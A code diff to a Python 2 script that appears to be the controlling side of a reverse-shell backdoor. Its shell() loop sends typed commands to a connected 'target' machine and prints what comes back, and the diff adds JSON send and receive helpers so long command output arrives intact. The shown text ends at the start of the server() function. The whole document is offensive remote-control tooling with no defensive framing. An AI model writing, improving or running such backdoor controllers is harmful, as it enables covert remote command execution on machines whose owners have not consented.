@@ -1,16 +1,30 @@
 #!/usr/bin/python
 
 import socket
+import json
 
+def reliable_send(data):
+    json_data = json.dumps(data)
+    target.send(json_data)
+
+
+def reliable_recv():
+    data = ""
+    while True:
+        try:
+            data = data + target.recv(1024)
+            return json.loads(data)
+        except ValueError:
+            continue
 
 def shell():
     while True:
         command = raw_input("Shell#~%s: "%str(ip))
-        target.send(command)
+        reliable_send(command)
         if command == 'q':
             break
         else:
-            result = target.recv(1024)
+            result = reliable_recv()
             print(result)
 
 def server():
